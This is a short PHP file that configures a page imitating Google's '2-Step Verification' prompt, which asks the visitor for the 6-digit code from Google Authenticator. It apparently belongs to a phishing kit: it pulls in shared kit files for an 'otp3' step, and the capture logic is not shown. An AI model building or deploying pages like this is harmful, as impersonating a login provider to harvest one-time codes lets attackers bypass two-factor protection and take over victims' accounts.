<?php
require_once('shade/core/functions.php');
$otp_page = 'otp3';
$otp_title = '2-Step Verification';
$otp_section_title = 'Get a verification code';
$otp_desc = 'Enter the 6-digit code from your Google Authenticator app.';
$otp_label = 'Enter the code';
$otp_secondary = 'Try another way';
$otp_show_prefix = false;
require 'includes/otp_page.php';
